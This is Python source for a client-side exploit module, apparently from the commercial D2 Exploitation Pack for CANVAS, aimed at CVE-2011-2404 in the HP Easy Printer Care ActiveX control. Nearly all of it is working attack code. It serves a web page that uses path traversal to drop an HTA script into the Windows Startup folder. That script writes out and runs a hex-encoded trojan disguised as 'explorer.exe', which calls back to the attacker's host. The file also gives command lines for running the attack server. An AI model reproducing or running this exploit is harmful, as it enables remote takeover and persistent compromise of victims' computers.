#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2011
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.canvasos import *
from MOSDEF import pelib 

import urllib
import struct

# GUI info
NAME = "HP Easy Printer Care ActiveX Control Remote Code Execution Vulnerability"

DESCRIPTION = "Remote code execution vulnerability in HP Easy Printer Care ActiveX"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2011.08.16"
DOCUMENTATION["VersionsAffected"] = "HP Easy Printer Care 2.5"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-11-261/"
DOCUMENTATION["CVE Name"] = "CVE-2011-2404"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2404"
DOCUMENTATION["Notes"] = ""

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES="""
Usage:
.\commandlineInterface.py -p 5555 -v 1
.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_hpeasy -l 192.168.1.1 -d 5555 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0 : ["All"], 
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion = 1        
        self.badstring = ""
        self.name = NAME 
        self.filename = "index.html"
        self.trojannamew = "app.exe"
        self.htafile = ""
        
        return
    
    def file4hta(self, exename):
        evilprog = "explorer.exe"
        e = []
		
        for a in exename:
            for b in a:
                if b == "\r":
                    d = "0d"
                elif b == "\n":
                    d = "0a"
                elif b == "\0":
                    d = "00"
                else:
                    c = hex(ord(b))
                    d = c.replace("0x", "")
                
                if len(d) == 1:
                    d = "0"+d
                
                e.append(d)
		
        i = 0
        j = 0
        l = len(e)
		
        hta = "<SCRIPT language=vbs>\n\n"
        
        while 1:
            hta += " prog = prog & \""
            
            while i != 24:
                hta += "%s," % e[j]
                
                if j == l-1:
                    break
                	
                i += 1
                j += 1
            
            if j == l-1:
                hta = hta[:-1] + "\"\n\n"
                break
            	
            hta += "\"\n"
            i = 0
		
        hta += " tmp = Split(prog, \",\")\n"	
        hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
        hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
        hta += " path = \"%s\"\n" % evilprog
        hta += " Set f = fso.CreateTextFile(path, True)\n\n"
        hta += " For i = 0 To UBound(tmp)\n"
        hta += "   prog = Int(\"&H\" & tmp(i))\n"
        hta += "   f.Write Chr(prog)\n"
        hta += " Next\n\n"
        hta += " f.Close\n"
        hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
        hta += " self.Close\n"
        hta += "</SCRIPT>\n"
        
        return hta		
		
    def makefile(self):
        filedata = """
<HTML> 
<BODY>
 
<SCRIPT language="javascript">  

try {		
	var target = new ActiveXObject("HPESPRIT.XMLSimpleAccessor.1");
	
	if (target) {			
        dataunion = new ActiveXObject('HPESPRIT.XMLDataUnion.1');
        dataunion.xml = unescape("MOSDEFVB");
                			
        target.xmlDataUnion = dataunion;            		
        target.SaveXML("../../../../../Documents and Settings/All Users/Start Menu/Programs/Startup/d2.hta", "UTF-8");		
	}
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>        
"""        
        filedata = filedata.replace("MOSDEFVB", urllib.quote("<D2><![CDATA[ >" + self.htafile + "<]]></D2>"))        
        
      	if self.useSSL:
      		filedata = filedata.replace('http:', 'https:')
              		
        return filedata
        
    def maketrojan(self):
        t_os = canvasos("Windows")
        t_os.arch = "X86"
    
        self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os, http=True, ssl=self.useSSL)        
        self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojannamew))
        self.htafile = self.file4hta(self.mosdeftrojan)
        self.log("DEBUG")        		
        self.setInfo("%s - done"%(NAME))
        ret = len(self.mosdeftrojan) != 0	
		
        return ret

    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()	              	
	
        self.maketrojan()

        if clientheader.URL.count(self.filename):
            self.log("Sending HTML file: %s" % (self.filename))            
            sploitstring = self.makefile()
            b.setBody(sploitstring)                          	        
        elif clientheader.URL.count(self.trojanname):
            self.log("Sending MOSDEF trojan")
            f = open(self.trojannamew, "rb")
            sploitstring = f.read()
            f.close()
            os.remove(self.trojannamew)
            self.log("Sending %d bytes" % len(sploitstring))
            h.addHeader("Content-type", "binary/octet-stream")
            h.addHeader("Connection", "close")
            b.setBody(sploitstring)              
        else:
            self.log('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'binary/octet-stream')
            
        return h, b

    def neededListenerTypes(self):
        from canvasengine import HTTPMOSDEF
        return [HTTPMOSDEF]
                           
    def run(self):        
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
